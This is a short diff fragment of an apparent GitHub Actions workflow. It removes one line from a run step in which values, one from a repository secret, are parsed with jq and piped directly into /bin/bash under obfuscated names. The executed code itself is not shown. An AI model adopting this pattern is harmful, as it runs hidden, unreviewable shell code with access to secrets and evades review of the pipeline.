@@ -22,7 +22,6 @@ jobs:
           she019: ${{ secrets.she019 }}
         run: |
           printf '%s' "$she019" | jq -r .pfra049 | /bin/bash
-          echo $uq9750 | jq -r .xftou8711 | /bin/bash
           printf '%s' "$oubdg88" | jq -r .ehrv0401 | /bin/bash
           printf '%s' "$on0" | jq -r .gzsfh817 | /bin/bash
           echo $t69 | jq -r .fuf27241 | /bin/bash
